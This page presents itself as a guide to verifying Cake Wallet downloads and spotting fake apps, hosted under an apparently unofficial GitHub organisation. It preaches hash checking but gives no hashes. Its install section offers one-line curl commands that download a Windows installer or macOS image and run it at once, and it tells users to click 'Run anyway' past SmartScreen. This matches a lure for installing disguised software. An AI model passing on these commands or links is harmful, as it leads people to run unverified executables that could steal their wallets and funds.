![Cake Wallet verify download guide](assets/cake-wallet-verify-download-article-banner.png)

# Verify a Cake Wallet Download and Spot Fake Apps

The hash, the source, and the messages that are never real.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Download only from the project's release page, which is the official installer source for the desktop builds, and compare each file's SHA-256 with the published value. The release labels the build and lists four assets; if a file on your disk is not one of them, it is not this release. No support channel ever asks for your recovery phrase.

<!-- ARTICLE-BODY-BEGIN -->

## Check the published hashes
Each desktop asset has a SHA-256 you can compare with the file on your disk: PowerShell for Windows, `shasum -a 256` on macOS and `sha256sum` on Linux. One differing character means the download is not the published file.

The <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">latest Cake Wallet release</a> is the only page to compare against. A hash printed on a blog, a mirror or a "download portal" tells you the file matches that page, not that the page is official.

## What this release actually contains
The release publishes four assets: a Windows installer, a macOS disk image, and two Linux files. It publishes no APK, no iOS file and no checksum manifest of its own, so a page that offers one of those "from this release" is describing something that does not exist.

The exact names are the check. An installer called something else may be the same app with a new name, or may not be the app at all, and only the hash distinguishes them.

## Fake support messages
Every real support channel has one rule in common: none of them needs your recovery phrase, your PIN or a screen share of your wallet. A message asking for any of those is impersonation, whatever name it uses and however official the avatar looks.

Report and block rather than argue. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-official-support.md">Cake Wallet support channels</a> lists the real routes, so an unsolicited message can be compared with them instead of judged on its tone.

## Clone listings and mirrors
App store clones copy the icon and the name; the publisher field is the tell. A store listing whose developer name does not match the official one is not the app, even if the screenshots are real.

Mirrors that host the same file are not necessarily malicious, but they are not a source you can verify, and they rank for download searches. If a search sends you somewhere unfamiliar, go to the release page directly.

## Installing after verification
Once the hash matches, install it and check that the app you opened is the app you expected. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-windows-install.md">Install Cake Wallet on Windows</a> covers the SmartScreen prompt and the setup steps, which is where a substituted file would otherwise get its chance.

Verification is a two-minute habit, and it is the only part of this that does not depend on trusting a page's design. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-android-apk.md">Install the Cake Wallet Android APK</a> covers the mobile equivalent, where the architecture choice and the Play Protect warning are the things to get right.

## When something already went wrong
If a phrase was entered into a site or shared with a "support" agent, treat the wallet as compromised: create a new wallet and move the funds, then stop using the old phrase. There is no way to un-share a phrase.

If a file was installed from an unverified source, remove it and reinstall from the release page, then restore from your own backup. Do not restore into the same app you are unsure about.

## FAQ
### How do I check that a Cake Wallet download is genuine?
Compare its SHA-256 with the value published on the release page. A mismatch means the file is not the published one.
### How can I tell a fake support message from a real one?
A real channel never asks for your phrase, PIN or a screen share. Any message that does is impersonation.
### How do I spot a fake crypto wallet?
Check the publisher on the store listing and the hash on desktop downloads. A wallet that asks for a phrase during setup is fake.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[Cake Wallet support channels](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-official-support.md) · [install Cake Wallet on Windows](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-windows-install.md) · [install the Cake Wallet Android APK](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-android-apk.md) · [latest Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
